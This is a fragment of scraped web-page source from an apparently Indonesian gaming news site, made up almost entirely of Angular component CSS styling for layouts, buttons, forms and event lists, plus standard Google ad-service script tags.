        .latest-article .news-content .news-content__post.small .caption img {
            margin-left: auto;
            margin-right: auto;
            display: block;
            margin-bottom: 12px;
            width: 50px
        }

        .latest-article .news-content .news-content__post.small .caption h3 {
            width: 100%;
            margin: 0;
            font-family: Montserrat-Semibold;
            font-size: 16px;
            color: #fff
        }

        .latest-article .news-content .news-content__post.small .caption .default {
            display: inline-block;
            overflow: hidden;
            border-radius: 5px;
            margin: 5px 5px 5px 0;
            color: #fff;
            font-family: Montserrat;
            font-size: 12px;
            text-transform: uppercase
        }

        .latest-article .news-content .col-md-6 .row>.col-md-12 .news-content__post--big::after {
            background: #876131;
            background: linear-gradient(0deg, #876131 0, rgba(135, 97, 49, 0) 100%)
        }

        .latest-article .news-content .col-md-6 .row>.col-md-12 .news-content__post--medium::after {
            background: #6a1818;
            background: linear-gradient(0deg, #6a1818 0, rgba(106, 24, 24, .00603992) 100%)
        }

        .latest-article .news-content .col-md-6 .row>.col-md-6:nth-child(2) .news-content__post--medium.small::after {
            background: #202e74;
            background: linear-gradient(0deg, #202e74 0, rgba(32, 46, 116, 0) 100%)
        }

        .latest-article .news-content .col-md-6 .row>.col-md-6:nth-child(3) .news-content__post--medium.small::after {
            background: #6a1818;
            background: linear-gradient(0deg, #6a1818 0, rgba(106, 24, 24, .00603992) 100%)
        }
    </style>
    <link rel="preload" href="https://adservice.google.co.id/adsid/integrator.js?domain=duniagames.co.id" as="script">
    <script type="text/javascript" src="https://adservice.google.co.id/adsid/integrator.js?domain=duniagames.co.id"></script>
    <link rel="preload" href="https://adservice.google.com/adsid/integrator.js?domain=duniagames.co.id" as="script">
    <script type="text/javascript" src="https://adservice.google.com/adsid/integrator.js?domain=duniagames.co.id"></script>
    <style>
        .justify-content-left[_ngcontent-gtc-c15] {
            justify-content: left !important
        }

        .justify-content-center[_ngcontent-gtc-c15] {
            justify-content: center !important
        }

        .justify-content-right[_ngcontent-gtc-c15] {
            justify-content: right !important
        }

        .justify-content-space-between[_ngcontent-gtc-c15] {
            justify-content: space-between !important
        }

        .justify-content-flex-end[_ngcontent-gtc-c15] {
            justify-content: flex-end !important
        }

        .text-decoration-line-through[_ngcontent-gtc-c15] {
            text-decoration: line-through !important
        }

        .text-decoration-underline[_ngcontent-gtc-c15] {
            text-decoration: underline !important
        }

        .text-decoration-overline[_ngcontent-gtc-c15] {
            text-decoration: overline !important
        }

        .text-decoration-none[_ngcontent-gtc-c15] {
            text-decoration: none !important
        }

        .align-self-center[_ngcontent-gtc-c15] {
            align-self: center
        }

        .cursor-no-drop[_ngcontent-gtc-c15] {
            cursor: no-drop !important
        }

        .cursor-pointer[_ngcontent-gtc-c15] {
            cursor: pointer !important
        }

        .text-left[_ngcontent-gtc-c15] {
            text-align: left !important
        }

        .text-center[_ngcontent-gtc-c15] {
            text-align: center !important
        }

        .text-right[_ngcontent-gtc-c15] {
            text-align: right !important
        }

        .text-justify[_ngcontent-gtc-c15] {
            text-align: justify !important
        }

        .v-align-top[_ngcontent-gtc-c15] {
            vertical-align: top !important
        }

        .v-align-middle[_ngcontent-gtc-c15] {
            vertical-align: middle !important
        }

        .v-align-bottom[_ngcontent-gtc-c15] {
            vertical-align: bottom !important
        }

        .float-left[_ngcontent-gtc-c15] {
            float: left !important
        }

        .float-right[_ngcontent-gtc-c15] {
            float: right !important
        }

        .mat-datepicker-toggle[_ngcontent-gtc-c15] button.mat-icon-button[_ngcontent-gtc-c15] {
            position: absolute;
            right: 0;
            top: 25px;
            width: 24px;
            height: 24px;
            color: #6a707d
        }

        .mat-datepicker-toggle[_ngcontent-gtc-c15] button.mat-icon-button[_ngcontent-gtc-c15] span.mat-button-wrapper[_ngcontent-gtc-c15],
        .mat-datepicker-toggle[_ngcontent-gtc-c15] button.mat-icon-button[_ngcontent-gtc-c15] span.mat-button-wrapper[_ngcontent-gtc-c15] svg.mat-datepicker-toggle-default-icon[_ngcontent-gtc-c15] {
            position: absolute;
            left: 0;
            top: 0;
            max-width: 24px;
            max-height: 24px
        }

        .cust-dropdown[_ngcontent-gtc-c15] {
            position: relative
        }

        .cust-dropdown[_ngcontent-gtc-c15] i.fa-caret-down[_ngcontent-gtc-c15] {
            position: absolute;
            width: 9px;
            height: 15px;
            top: 0;
            bottom: 0;
            right: 5px;
            margin: auto
        }

        .cust-dropdown[_ngcontent-gtc-c15] input[type=text][_ngcontent-gtc-c15] {
            width: calc(100% - 10px);
            padding: 5px 10px;
            margin-right: 10px;
            background: 0 0;
            border: 0;
            outline: 0
        }

        .cust-dropdown[_ngcontent-gtc-c15] .cust-option[_ngcontent-gtc-c15] {
            display: none;
            position: absolute;
            min-width: 100%;
            top: 100%;
            background: #1d1f23;
            z-index: 99;
            padding: 15px 25px;
            box-shadow: 0 3px 8px 0 rgba(0, 0, 0, .35);
            border-radius: 3px
        }

        .cust-dropdown[_ngcontent-gtc-c15] .cust-option.active[_ngcontent-gtc-c15] {
            display: block
        }

        .cust-dropdown[_ngcontent-gtc-c15] .cust-option[_ngcontent-gtc-c15] ul.option-list[_ngcontent-gtc-c15] {
            margin: 0;
            padding: 0;
            list-style: none
        }

        .cust-dropdown[_ngcontent-gtc-c15] .cust-option[_ngcontent-gtc-c15] ul.option-list[_ngcontent-gtc-c15] li[_ngcontent-gtc-c15] {
            margin: 0;
            padding: 0;
            list-style: none;
            position: relative
        }

        .cust-dropdown[_ngcontent-gtc-c15] .cust-option[_ngcontent-gtc-c15] ul.option-list[_ngcontent-gtc-c15] li[_ngcontent-gtc-c15] label[_ngcontent-gtc-c15] {
            display: block;
            margin: 0;
            padding: 10px 0 10px 30px
        }

        .cust-dropdown[_ngcontent-gtc-c15] .cust-option[_ngcontent-gtc-c15] ul.option-list[_ngcontent-gtc-c15] li[_ngcontent-gtc-c15] label[_ngcontent-gtc-c15]:before {
            content: "";
            position: absolute;
            width: 20px;
            height: 20px;
            top: 0;
            bottom: 0;
            left: 0;
            margin: auto;
            border: 1px solid #fff;
            border-radius: 50%
        }

        .cust-dropdown[_ngcontent-gtc-c15] .cust-option[_ngcontent-gtc-c15] ul.option-list[_ngcontent-gtc-c15] li[_ngcontent-gtc-c15] label[_ngcontent-gtc-c15]:after {
            content: "";
            opacity: 0;
            position: absolute;
            width: 10px;
            height: 10px;
            top: 0;
            bottom: 0;
            left: 5px;
            margin: auto;
            border: 1px solid #fff;
            background: #fff;
            border-radius: 50%
        }

        .cust-dropdown[_ngcontent-gtc-c15] .cust-option[_ngcontent-gtc-c15] ul.option-list[_ngcontent-gtc-c15] li[_ngcontent-gtc-c15] input[type=radio][_ngcontent-gtc-c15] {
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            opacity: 0
        }

        .cust-dropdown[_ngcontent-gtc-c15] .cust-option[_ngcontent-gtc-c15] ul.option-list[_ngcontent-gtc-c15] li[_ngcontent-gtc-c15] input[type=radio][_ngcontent-gtc-c15]:checked+label[_ngcontent-gtc-c15]:after {
            opacity: 1
        }

        html[_ngcontent-gtc-c15] {
            scroll-behavior: smooth
        }

        body[_ngcontent-gtc-c15] {
            margin: 0;
            padding: 0;
            overflow-x: hidden !important
        }

        a[_ngcontent-gtc-c15],
        label[_ngcontent-gtc-c15],
        ol[_ngcontent-gtc-c15] li[_ngcontent-gtc-c15],
        table[_ngcontent-gtc-c15] td[_ngcontent-gtc-c15],
        table[_ngcontent-gtc-c15] th[_ngcontent-gtc-c15],
        ul[_ngcontent-gtc-c15] li[_ngcontent-gtc-c15] {
            font-family: Montserrat
        }

        b[_ngcontent-gtc-c15] {
            font-family: Montserrat-Bold;
            font-weight: 800
        }

        h1[_ngcontent-gtc-c15],
        h2[_ngcontent-gtc-c15],
        h3[_ngcontent-gtc-c15],
        h4[_ngcontent-gtc-c15],
        h5[_ngcontent-gtc-c15],
        h6[_ngcontent-gtc-c15],
        p[_ngcontent-gtc-c15],
        span[_ngcontent-gtc-c15] {
            margin: 0;
            font-family: Montserrat
        }

        button[_ngcontent-gtc-c15] {
            outline: 0;
            font-family: Montserrat
        }

        input[_ngcontent-gtc-c15],
        textarea[_ngcontent-gtc-c15] {
            font-family: Montserrat;
            color: #fff
        }

        label.error-label[_ngcontent-gtc-c15] {
            margin: 5px 0;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 400;
            color: #d0021b;
            display: block
        }

        label.success-label[_ngcontent-gtc-c15] {
            margin: 5px 0;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 400;
            color: green;
            display: block
        }

        label.label-input[_ngcontent-gtc-c15] {
            display: block;
            font-family: Montserrat;
            font-size: 12px;
            color: #6a707d;
            margin-bottom: 10px
        }

        @media (max-width:767px) {
            label.label-input[_ngcontent-gtc-c15] {
                font-size: 11px
            }
        }

        label.label-media[_ngcontent-gtc-c15] {
            display: block;
            font-family: Montserrat;
            font-size: .8em;
            color: #6a707d;
            margin-bottom: 10px
        }

        .close-solid[_ngcontent-gtc-c15] {
            padding: 5px;
            height: 30px;
            width: 30px;
            background: 0 0;
            border: none;
            cursor: pointer
        }

        .close-solid[_ngcontent-gtc-c15] span[_ngcontent-gtc-c15] {
            height: 100%;
            width: 100%;
            display: inline-block;
            background-image: url(close-global.785be75897033bcf1c3f.png);
            background-size: 50px;
            background-repeat: no-repeat;
            background-position: center
        }

        .close-circle-wrap[_ngcontent-gtc-c15] {
            position: relative;
            float: right;
            margin-top: 20px;
            z-index: 1;
            background: 0 0;
            border: none
        }

        .close-circle-wrap[_ngcontent-gtc-c15] p[_ngcontent-gtc-c15] {
            display: inline-block;
            vertical-align: middle;
            color: #fff;
            font-family: Montserrat-Bold;
            font-weight: 600;
            font-size: .9em;
            text-transform: uppercase
        }

        @media (max-width:767px) {
            .close-circle-wrap[_ngcontent-gtc-c15] p[_ngcontent-gtc-c15] {
                font-size: .75em
            }
        }

        .close-circle-wrap[_ngcontent-gtc-c15] p.close-circle[_ngcontent-gtc-c15] {
            height: 42px;
            width: 42px;
            background: 0 0;
            border: 2px solid #fff;
            cursor: pointer;
            padding: 12px;
            margin-left: 10px;
            border-radius: 100%;
            opacity: .5
        }

        .close-circle-wrap[_ngcontent-gtc-c15] p.close-circle[_ngcontent-gtc-c15] span[_ngcontent-gtc-c15] {
            height: 100%;
            width: 100%;
            display: inline-block;
            background-image: url(close-global.785be75897033bcf1c3f.png);
            background-size: 50px;
            background-repeat: no-repeat;
            background-position: center
        }

        .cta.cta--generate[_ngcontent-gtc-c15] {
            margin-top: 30px;
            padding: 16px 27px;
            background: #d0021b;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 600;
            text-transform: uppercase;
            color: #fff;
            border: none;
            border-radius: 3px;
            letter-spacing: 1px
        }

        .cta.cta--create[_ngcontent-gtc-c15] {
            text-decoration: none;
            padding: 10px 5px 10px 30px;
            background: #d0021b;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 600;
            text-transform: uppercase;
            color: #fff;
            border: 1px solid transparent;
            border-radius: 3px;
            letter-spacing: 1px
        }

        .cta.cta--create[_ngcontent-gtc-c15] span[_ngcontent-gtc-c15] {
            font-family: Montserrat;
            font-size: .8em;
            color: #fff;
            background: #9c0114;
            padding: 5px 10px;
            display: inline-block;
            border-radius: 3px;
            margin: 0 10px
        }

        .cta.cta--border-transparent[_ngcontent-gtc-c15] {
            text-decoration: none;
            padding: 10px 40px;
            background: 0 0;
            font-family: Montserrat;
            font-size: .9em;
            font-weight: 600;
            text-transform: uppercase;
            color: #fff;
            border: 1px solid #fff;
            border-radius: 3px;
            letter-spacing: 1px
        }

        .cta.cta--transparent-white[_ngcontent-gtc-c15] {
            font-family: Montserrat;
            border: 1px solid #fff;
            padding: 15px 20px;
            border-radius: 4px;
            background: 0 0;
            outline: 0;
            font-size: .9em;
            font-weight: 600;
            color: #fff;
            text-transform: uppercase;
            text-decoration: none;
            letter-spacing: 1px
        }

        .cta.cta--solid-grey[_ngcontent-gtc-c15] {
            font-family: Montserrat;
            border: 1px solid transparent;
            padding: 15px 60px;
            border-radius: 4px;
            background: #2d2d30;
            outline: 0;
            font-size: .9em;
            font-weight: 600;
            color: #6b6b6d;
            text-transform: uppercase;
            text-decoration: none;
            letter-spacing: 1px
        }

        a.close-frame[_ngcontent-gtc-c15] {
            position: absolute;
            right: 30px;
            top: 0;
            font-family: Montserrat;
            color: #fff;
            font-size: .9em;
            font-weight: 400;
            text-transform: uppercase;
            opacity: 1;
            z-index: 10
        }

        a.close-frame.close-frame--tournament[_ngcontent-gtc-c15] span[_ngcontent-gtc-c15] {
            padding: 4px 9px 4px 12px;
            border: 3px solid #6a707d;
            width: 42px;
            height: 42px;
            font-size: 20px;
            font-weight: 700;
            top: 16px
        }

        a.close-frame.close-frame--tournament[_ngcontent-gtc-c15] p[_ngcontent-gtc-c15] {
            font-family: Montserrat;
            font-size: 13px;
            font-weight: 700;
            font-style: normal;
            font-stretch: normal;
            line-height: 1.23;
            letter-spacing: 1.4px;
            text-align: center;
            color: #fff
        }

        a.close-frame[_ngcontent-gtc-c15] p[_ngcontent-gtc-c15] {
            display: inline-block
        }

        @media (max-width:767px) {
            a.close-frame[_ngcontent-gtc-c15] {
                right: 10px
            }
            a.close-frame[_ngcontent-gtc-c15] p[_ngcontent-gtc-c15] {
                display: none
            }
        }

        a.close-frame[_ngcontent-gtc-c15] span[_ngcontent-gtc-c15] {
            margin-left: 10px;
            font-family: Montserrat;
            display: inline-block;
            width: 30px;
            height: 30px;
            padding: 5px 10px;
            border: 1px solid #6a707d;
            color: #6a707d;
            font-weight: 600;
            overflow: hidden;
            border-radius: 100%;
            position: relative;
            right: 0;
            top: 10px
        }

        .form-control[_ngcontent-gtc-c15] {
            position: relative;
            font-family: Montserrat !important;
            font-size: 1em;
            outline: 0;
            background: 0 0;
            border-radius: 0;
            box-shadow: none
        }

        .form-control.form-control--default[_ngcontent-gtc-c15] {
            padding: 0;
            border: none;
            border-bottom: 1px solid rgba(106, 112, 125, .49);
            box-shadow: none;
            color: #fff
        }

        .form-control.form-control--count[_ngcontent-gtc-c15] {
            text-align: center;
            margin: 0 10px 10px;
            width: 50px;
            padding: 0;
            border: none;
            border-bottom: 1px solid rgba(106, 112, 125, .49);
            box-shadow: none;
            color: #fff
        }

        .form-control.form-control--transparent[_ngcontent-gtc-c15] {
            outline: 0;
            color: #fff;
            font-size: 1em;
            box-shadow: none;
            padding: 0;
            background: 0 0;
            border: none;
            box-shadow: none
        }

        .form-control.form-control--textarea[_ngcontent-gtc-c15] {
            outline: 0;
            color: #fff;
            font-size: 1em;
            box-shadow: none;
            padding: 10px;
            border-radius: 4px;
            background-color: rgba(106, 112, 125, .19);
            border: none;
            box-shadow: none
        }

        .form-control[_ngcontent-gtc-c15]::-moz-placeholder {
            color: #69707e
        }

        .form-control[_ngcontent-gtc-c15]::-ms-input-placeholder {
            color: #69707e
        }

        .form-control[_ngcontent-gtc-c15]::placeholder {
            color: #69707e
        }

        .header-text[_ngcontent-gtc-c15] h3[_ngcontent-gtc-c15] {
            font-family: Montserrat-Bold;
            font-size: 2.3em;
            text-transform: capitalize;
            color: #fff
        }

        @media (max-width:767px) {
            a.close-frame[_ngcontent-gtc-c15] span[_ngcontent-gtc-c15] {
                right: 10px
            }
            .header-text[_ngcontent-gtc-c15] h3[_ngcontent-gtc-c15] {
                font-size: 1.5em
            }
        }

        .header-text[_ngcontent-gtc-c15] h4[_ngcontent-gtc-c15] {
            font-family: Montserrat-Bold;
            font-size: 1.5em;
            color: #fff
        }

        .header-text[_ngcontent-gtc-c15] p[_ngcontent-gtc-c15] {
            font-family: Montserrat;
            font-size: 1em;
            font-weight: 400;
            font-style: normal;
            font-stretch: normal;
            line-height: 1.5;
            letter-spacing: normal;
            text-align: center;
            color: #b4b4c0
        }

        .header-text-medium[_ngcontent-gtc-c15] h3[_ngcontent-gtc-c15] {
            font-family: Montserrat-Bold;
            font-size: 2em;
            color: #fff
        }

        .header-text-small[_ngcontent-gtc-c15] h3[_ngcontent-gtc-c15] {
            font-family: Montserrat-Bold;
            font-size: 1.5em;
            color: #fff
        }

        @media (max-width:767px) {
            .header-text-medium[_ngcontent-gtc-c15] h3[_ngcontent-gtc-c15],
            .header-text-small[_ngcontent-gtc-c15] h3[_ngcontent-gtc-c15] {
                font-size: 1.5em
            }
        }

        .header-text-extra-small[_ngcontent-gtc-c15] h3[_ngcontent-gtc-c15] {
            font-family: Montserrat;
            font-size: 1.2em;
            color: #fff
        }

        @media (max-width:767px) {
            .header-text-extra-small[_ngcontent-gtc-c15] h3[_ngcontent-gtc-c15] {
                font-size: 1em
            }
        }

        .header-text-extra-small-bold[_ngcontent-gtc-c15] h3[_ngcontent-gtc-c15] {
            font-family: Montserrat-Bold;
            font-size: 1.2em;
            color: #fff
        }

        .body-text[_ngcontent-gtc-c15] p[_ngcontent-gtc-c15] {
            font-family: Montserrat;
            font-size: 1em;
            font-weight: 400;
            font-style: normal;
            font-stretch: normal;
            line-height: 1.5;
            letter-spacing: normal;
            text-align: center;
            color: #b4b4c0
        }

        .description-text[_ngcontent-gtc-c15] p[_ngcontent-gtc-c15] {
            font-size: 1em;
            color: #fff
        }

        .radio-input[_ngcontent-gtc-c15] {
            position: absolute;
            left: 0;
            right: 0;
            top: 0;
            bottom: 0;
            height: 100%;
            width: 100%;
            z-index: 9;
            opacity: 0
        }

        .middle-top[_ngcontent-gtc-c15] {
            margin: auto;
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            transform: translateY(-50%)
        }

        .fleft[_ngcontent-gtc-c15] {
            float: left
        }

        .fright[_ngcontent-gtc-c15] {
            float: right
        }

        .row[_ngcontent-gtc-c15] .padding-left-0[_ngcontent-gtc-c15] {
            padding-left: 0
        }

        .form-group.form-group--media[_ngcontent-gtc-c15] {
            position: relative;
            border-bottom: 1px solid #2b2e34
        }

        .dd-selected[_ngcontent-gtc-c15] {
            background: 0 0
        }

        .invalid-feedback[_ngcontent-gtc-c15] {
            text-align: left;
            position: relative;
            z-index: 1
        }

        .popup-shuffle[_ngcontent-gtc-c15] {
            position: fixed;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            z-index: 99
        }

        .popup-shuffle[_ngcontent-gtc-c15]:before {
            content: "";
            position: absolute;
            width: 100%;
            height: 100%;
            top: 0;
            left: 0;
            background-color: rgba(0, 0, 0, .8)
        }

        .popup-shuffle[_ngcontent-gtc-c15] .shuffle-container[_ngcontent-gtc-c15] {
            width: 400px;
            height: 120px;
            max-width: 90vw;
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            margin: auto;
            border: 3px solid #6a707d;
            background: #1d1f23;
            border-radius: 4px;
            display: block
        }

        .popup-shuffle[_ngcontent-gtc-c15] .shuffle-container[_ngcontent-gtc-c15]>.row[_ngcontent-gtc-c15] {
            display: block;
            position: absolute;
            top: 50%;
            transform: translateY(-50%)
        }

        .popup-shuffle[_ngcontent-gtc-c15] .shuffle-container[_ngcontent-gtc-c15] .shuffle-pop-table[_ngcontent-gtc-c15] {
            display: table
        }

        .popup-shuffle[_ngcontent-gtc-c15] .shuffle-container[_ngcontent-gtc-c15] .shuffle-pop-table[_ngcontent-gtc-c15] .shuffle-pop-item[_ngcontent-gtc-c15] {
            display: table-cell;
            vertical-align: middle;
            width: 80%;
            padding-left: 20px
        }

        .popup-shuffle[_ngcontent-gtc-c15] .shuffle-container[_ngcontent-gtc-c15] .shuffle-pop-table[_ngcontent-gtc-c15] .shuffle-pop-item.img[_ngcontent-gtc-c15] {
            width: 20%;
            padding-left: 0
        }

        .popup-shuffle[_ngcontent-gtc-c15] .shuffle-container[_ngcontent-gtc-c15] img[_ngcontent-gtc-c15] {
            max-width: 100%
        }

        .popup-shuffle[_ngcontent-gtc-c15] .shuffle-container[_ngcontent-gtc-c15] p[_ngcontent-gtc-c15] {
            color: #fff;
            font-size: 1em
        }

        .popup-shuffle[_ngcontent-gtc-c15] .shuffle-container[_ngcontent-gtc-c15] p[_ngcontent-gtc-c15] strong[_ngcontent-gtc-c15] {
            font-size: 1.09em
        }

        .mat-datepicker-content[_ngcontent-gtc-c15] {
            background: #1d1f23
        }

        .mat-calendar-body-cell-content[_ngcontent-gtc-c15] {
            color: #fff
        }

        .mat-calendar-body-disabled[_ngcontent-gtc-c15]>.mat-calendar-body-cell-content[_ngcontent-gtc-c15]:not(.mat-calendar-body-selected) {
            color: #616161
        }

        .mat-calendar-body-label[_ngcontent-gtc-c15],
        .mat-calendar-table-header[_ngcontent-gtc-c15] th[_ngcontent-gtc-c15],
        .mat-datepicker-content[_ngcontent-gtc-c15] .mat-calendar-next-button[_ngcontent-gtc-c15],
        .mat-datepicker-content[_ngcontent-gtc-c15] .mat-calendar-previous-button[_ngcontent-gtc-c15],
        .mat-datepicker-toggle[_ngcontent-gtc-c15],
        .mat-icon-button[disabled][disabled][_ngcontent-gtc-c15] {
            color: #fff
        }

        .mat-calendar-arrow[_ngcontent-gtc-c15] {
            border-top-color: #fff
        }

        .mat-calendar-header[_ngcontent-gtc-c15] {
            color: #fff
        }

        .cdk-keyboard-focused[_ngcontent-gtc-c15] .mat-calendar-body-active[_ngcontent-gtc-c15]>.mat-calendar-body-cell-content[_ngcontent-gtc-c15]:not(.mat-calendar-body-selected),
        .cdk-program-focused[_ngcontent-gtc-c15] .mat-calendar-body-active[_ngcontent-gtc-c15]>.mat-calendar-body-cell-content[_ngcontent-gtc-c15]:not(.mat-calendar-body-selected),
        .mat-calendar-body-cell[_ngcontent-gtc-c15]:not(.mat-calendar-body-disabled):hover>.mat-calendar-body-cell-content[_ngcontent-gtc-c15]:not(.mat-calendar-body-selected),
        .mat-calendar-body-today[_ngcontent-gtc-c15]:not(.mat-calendar-body-selected) {
            border-color: transparent;
            background: #d0021b
        }

        .mat-calendar-body-selected[_ngcontent-gtc-c15] {
            background: #d0021b;
            box-shadow: none
        }

        .block-url[_ngcontent-gtc-c15] {
            position: absolute;
            content: "";
            left: 0;
            right: 0;
            top: 0;
            bottom: 0;
            z-index: 91
        }

        .mat-primary[_ngcontent-gtc-c15] .mat-option.mat-selected[_ngcontent-gtc-c15]:not(.mat-option-disabled) {
            color: #000;
            opacity: .8
        }

        .mat-select-panel[_ngcontent-gtc-c15] .mat-option[_ngcontent-gtc-c15] {
            color: #797979
        }

        .ngx-editor-textarea[_ngcontent-gtc-c15] div[_ngcontent-gtc-c15],
        .ngx-editor-textarea[_ngcontent-gtc-c15] section[_ngcontent-gtc-c15] {
            max-width: 100% !important;
            width: 100% !important;
            background: 0 0 !important;
            box-shadow: none !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c15] div[_ngcontent-gtc-c15] img[_ngcontent-gtc-c15],
        .ngx-editor-textarea[_ngcontent-gtc-c15] section[_ngcontent-gtc-c15] img[_ngcontent-gtc-c15] {
            width: 100% !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c15] a[_ngcontent-gtc-c15] {
            text-decoration: none !important;
            border: none !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c15] *[_ngcontent-gtc-c15] {
            max-width: 100% !important;
            font-family: Montserrat !important;
            background: 0 0 !important;
            line-height: 1.5;
            word-break: break-word !important;
            text-indent: unset !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c15] b[_ngcontent-gtc-c15] {
            font-family: Montserrat-Bold !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c15] b[_ngcontent-gtc-c15] *[_ngcontent-gtc-c15] {
            font-family: Montserrat-Bold !important;
            text-indent: unset !important
        }

        .ngx-editor-textarea[_ngcontent-gtc-c15] td[_ngcontent-gtc-c15] {
            border-color: #6a707d !important;
            padding: 8px !important
        }

        .app-layout-wrap[_ngcontent-gtc-c15] {
            background-color: #000
        }

        @media (min-width:1200px) {
            .d-main[_ngcontent-gtc-c15] {
                max-width: 1440px;
                margin: 0 auto
            }
            .layout-content[_ngcontent-gtc-c15] {
                background-color: #000
            }
        }

        .d-absolute--center[_ngcontent-gtc-c15] {
            position: absolute;
            top: 40%;
            width: 100%;
            text-align: center;
            z-index: 2
        }

        .d-absolute--center[_ngcontent-gtc-c15] img[_ngcontent-gtc-c15] {
            width: 50px;
            opacity: .5
        }

        @media (max-width:767px) {
            .header-text-extra-small-bold[_ngcontent-gtc-c15] h3[_ngcontent-gtc-c15] {
                font-size: 1em
            }
            .fleft[_ngcontent-gtc-c15] {
                float: right
            }
            .fright[_ngcontent-gtc-c15] {
                float: left
            }
            .popup-shuffle[_ngcontent-gtc-c15] .shuffle-container[_ngcontent-gtc-c15] .shuffle-pop-table[_ngcontent-gtc-c15] {
                padding: 0 20px
            }
            .mat-datepicker-toggle[_ngcontent-gtc-c15] button.mat-icon-button[_ngcontent-gtc-c15] {
                top: auto;
                bottom: 7px
            }
            .section-side-list[_ngcontent-gtc-c15] {
                padding-bottom: 15px
            }
        }

        .adds-banner[_ngcontent-gtc-c15] {
            display: flex;
            width: 100%;
            height: 136px;
            justify-content: center;
            align-items: center;
            margin: 15px 0;
            overflow: hidden
        }

        .adds-banner.addfirst[_ngcontent-gtc-c15] {
            margin-top: 0
        }

        .adds-banner[_ngcontent-gtc-c15] p[_ngcontent-gtc-c15] {
            font-size: 30px;
            color: #fff;
            opacity: .5
        }

        .header-more[_ngcontent-gtc-c15] {
            margin-top: 16px
        }

        .header-more[_ngcontent-gtc-c15] a[_ngcontent-gtc-c15] {
            font-family: Montserrat;
            color: #fff;
            font-size: 16px;
            font-weight: 600;
            text-decoration: none
        }

        .header-more[_ngcontent-gtc-c15] a[_ngcontent-gtc-c15] span[_ngcontent-gtc-c15] {
            position: relative;
            display: inline-block;
            height: 18px;
            width: 18px;
            margin: -4px 0 -4px 10px;
            background: #d0021b;
            overflow: hidden;
            border-radius: 3px;
            float: right;
            top: 5px
        }

        .header-more[_ngcontent-gtc-c15] a[_ngcontent-gtc-c15] span[_ngcontent-gtc-c15]::after {
            position: absolute;
            font-family: FontAwesome;
            content: "\f105";
            right: 6px;
            top: -3px
        }

        .event-list[_ngcontent-gtc-c15] {
            margin-top: 16px;
            border-top: 1px solid rgba(255, 255, 255, .2);
            border-bottom: 1px solid rgba(255, 255, 255, .2)
        }

        .event-list[_ngcontent-gtc-c15] .tournament-highlight[_ngcontent-gtc-c15] .event-item[_ngcontent-gtc-c15] {
            padding: 0 0 12px;
            cursor: pointer
        }

        .event-list[_ngcontent-gtc-c15] .tournament-highlight[_ngcontent-gtc-c15] .event-item[_ngcontent-gtc-c15] .link[_ngcontent-gtc-c15]:focus {
            outline: 0
        }

        .event-list[_ngcontent-gtc-c15] .tournament-highlight[_ngcontent-gtc-c15] .event-item[_ngcontent-gtc-c15] .logo[_ngcontent-gtc-c15] {
            height: 40px;
            margin: 3px 14px 0 5px;
            width: 40px;
            float: left;
            border-radius: 100%;
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat
        }

        .event-list[_ngcontent-gtc-c15] .tournament-highlight[_ngcontent-gtc-c15] .event-item[_ngcontent-gtc-c15] h3[_ngcontent-gtc-c15] {
            margin: 10px 0 0;
            font-family: Montserrat;
            font-size: 14px;
            font-weight: 600;
            font-stretch: normal;
            font-style: normal;
            line-height: 1.5;
            letter-spacing: normal;
            color: #fff
        }

        .event-list[_ngcontent-gtc-c15] .tournament-highlight[_ngcontent-gtc-c15] .event-item[_ngcontent-gtc-c15] p[_ngcontent-gtc-c15] {
            display: block;
            color: #b4b4c0;
            margin-left: 59px;
            font-family: Montserrat
        }

        .event-list[_ngcontent-gtc-c15] .tournament-highlight[_ngcontent-gtc-c15]:first-child {
            padding: 12px 0
        }

        .event-list[_ngcontent-gtc-c15] .leaderboards[_ngcontent-gtc-c15] .event-item[_ngcontent-gtc-c15] {
            padding: 12px 0;
            cursor: pointer;
            position: relative
        }

        .event-list[_ngcontent-gtc-c15] .leaderboards[_ngcontent-gtc-c15] .event-item[_ngcontent-gtc-c15] .link[_ngcontent-gtc-c15] {
            display: flex
        }

        .event-list[_ngcontent-gtc-c15] .leaderboards[_ngcontent-gtc-c15] .event-item[_ngcontent-gtc-c15] .link[_ngcontent-gtc-c15]:focus {
            outline: 0
        }

        .event-list[_ngcontent-gtc-c15] .leaderboards[_ngcontent-gtc-c15] .event-item[_ngcontent-gtc-c15] .logo[_ngcontent-gtc-c15] {
            height: 40px;
            margin: 3px 14px 0 5px;
            width: 40px;
            float: left;
            border-radius: 100%;
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat
        }

        .event-list[_ngcontent-gtc-c15] .leaderboards[_ngcontent-gtc-c15] .event-item[_ngcontent-gtc-c15] h3[_ngcontent-gtc-c15] {
            margin: 2px 0;
            font-family: Montserrat;
            font-size: 14px;
            font-weight: 600;
            font-stretch: normal;
            font-style: normal;
            line-height: 1.5;
            letter-spacing: normal;
            color: #fff;
            float: left
        }

        .event-list[_ngcontent-gtc-c15] .leaderboards[_ngcontent-gtc-c15] .event-item[_ngcontent-gtc-c15] h3[_ngcontent-gtc-c15] p[_ngcontent-gtc-c15] {
            font-size: 12px;
            display: block;
            color: #b4b4c0;
            font-family: Montserrat;
            font-weight: 400
        }

        .event-list[_ngcontent-gtc-c15] .leaderboards[_ngcontent-gtc-c15] .event-item[_ngcontent-gtc-c15] .badage[_ngcontent-gtc-c15] {
            height: 24px;
            width: 24px;
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            top: 20px;
            right: 0;
            position: absolute
        }

        .event-list[_ngcontent-gtc-c15] .events[_ngcontent-gtc-c15] .event-item[_ngcontent-gtc-c15] {
            padding: 12px 0;
            cursor: pointer;
            position: relative
        }

        .event-list[_ngcontent-gtc-c15] .events[_ngcontent-gtc-c15] .event-item[_ngcontent-gtc-c15] .link[_ngcontent-gtc-c15]:focus {
            outline: 0
        }

